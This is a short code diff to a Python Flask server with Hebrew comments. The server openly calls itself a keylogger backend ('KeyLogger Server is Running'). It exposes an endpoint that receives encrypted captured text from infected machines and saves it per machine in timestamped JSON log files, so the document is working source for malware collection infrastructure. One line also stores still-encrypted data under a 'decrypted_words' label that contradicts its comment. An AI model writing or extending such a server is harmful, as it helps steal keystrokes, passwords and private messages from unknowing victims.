@@ -15,7 +15,9 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 data_dir = "data"
 os.makedirs(data_dir, exist_ok=True)  # יצירת התיקייה אם היא לא קיימת
 
-
+@app.route('/')
+def home():
+    return f"KeyLogger Server is Running"
 
 # נקודת קצה (endpoint) לקבלת נתונים מוצפנים ממכונה
 @app.route("/api/send_data", methods=["POST"])
@@ -39,7 +41,7 @@ def receive_data():
         os.makedirs(machine_dir, exist_ok=True)
 
         # יוצרים קובץ לוג עם חותמת זמן ושומרים את הנתונים המפוענחים
-        log_filename = os.path.join(machine_dir, f"log_{timestamp}.txt")
+        log_filename = os.path.join(machine_dir, f"log_{timestamp}.json")
         with open(log_filename, "w") as file:
             json.dump({"decrypted_words": encrypted_words}, file)  # שומרים את הנתונים בקובץ
 
